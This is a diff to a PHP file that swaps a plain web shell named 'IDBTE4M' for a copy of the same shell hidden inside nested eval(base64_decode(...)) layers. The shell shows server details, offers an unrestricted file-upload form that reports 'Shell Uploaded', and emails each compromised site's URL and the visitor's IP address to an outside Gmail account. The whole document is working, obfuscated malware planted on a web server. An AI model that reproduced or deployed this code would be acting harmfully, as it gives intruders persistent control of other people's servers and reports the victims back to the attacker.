@@ -1,14 +1,1 @@
-<?php
-error_reporting(0);
-echo '<title>IDBTE4M</title>';
-echo '<center><b><h1>IDBTE4M</h1>'.'<br>'.'[uname] '.php_uname().' [/uname] <br> Posisi : '.$cwd = getcwd(); Echo '<br><br><center><form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form></b>';
-if( $_POST['_upl'] == "Upload" ) {
-if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)'; }
-else { echo '<b>Not uploaded !'; }
-}
-header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = 'kalix0xalik@gmail.com';
-$x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
-$pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-mail($tujuanmail, "Tuyul hari ini", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");?>
+<head><title>IDBTE4M</title></head><?php eval("?>".base64_decode("ZXJyb3JfcmVwb3J0aW5nKDApOw0KZWNobyAnPHRpdGxlPklEQlRFNE08L3RpdGxlPic7DQplY2hvICc8Y2VudGVyPjxiPjxoMT5JREJURTRNPC9oMT4nLic8YnI+Jy4nW3VuYW1lXSAnLnBocF91bmFtZSgpLicgWy91bmFtZV0gPGJyPiBQb3Npc2kgOiAnLiRjd2QgPSBnZXRjd2QoKTsgRWNobyAnPGJyPjxicj48Y2VudGVyPjxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiIG5hbWU9InVwbG9hZGVyIiBpZD0idXBsb2FkZXIiPic7DQplY2hvICc8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZSIgc2l6ZT0iNTAiPjxpbnB1dCBuYW1lPSJfdXBsIiB0eXBlPSJzdWJtaXQiIGlkPSJfdXBsIiB2YWx1ZT0iVXBsb2FkIj48L2Zvcm0+PC9iPic7DQppZiggJF9QT1NUWydfdXBsJ10gPT0gIlVwbG9hZCIgKSB7DQppZihAY29weSgkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ10sICRfRklMRVNbJ2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvICc8Yj5TaGVsbCBVcGxvYWRlZCAhIDopJzsgfQ0KZWxzZSB7IGVjaG8gJzxiPk5vdCB1cGxvYWRlZCAhJzsgfQ0KfQ0KaGVhZGVyKCdDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCcpOw0KJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107DQokcGVzYW5fYWxlcnQgPSAiZml4ICR4X3BhdGggOnAgKklQIEFkZHJlc3MgOiBbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSI7DQpldmFsKGJhc2U2NF9kZWNvZGUoJ0pIUjFhblZoYm0xaGFXd2dQU0FuYTJGc2FYZ3dlR0ZzYVd0QVoyMWhhV3d1WTI5dEp6c0tKSGhmY0dGMGFDQTlJQ0pvZEhSd09pOHZJaUF1SUNSZlUwVlNWa1ZTV3lkVFJWSldSVkpmVGtGTlJTZGRJQzRnSkY5VFJWSldSVkpiSjFKRlVWVkZVMVJmVlZKSkoxMDdDaVJ3WlhOaGJsOWhiR1Z5ZENBOUlDSm1hWGdnSkhoZmNHRjBhQ0E2Y0NBcVNWQWdRV1JrY21WemN5QTZJRnNnSWlBdUlDUmZVMFZTVmtWU1d5ZFNSVTFQVkVWZlFVUkVVaWRkSUM0Z0lpQmRJanNLYldGcGJDZ2tkSFZxZFdGdWJXRnBiQ3dnSWtOdmJuUmhZM1FnVFdVaUxDQWtjR1Z6WVc1ZllXeGxjblFzSUNKYklDSWdMaUFrWDFORlVsWkZVbHNuVWtWTlQxUkZYMEZFUkZJblhTQXVJQ0lnWFNJcE93PT0nKSk7DQo="));?>
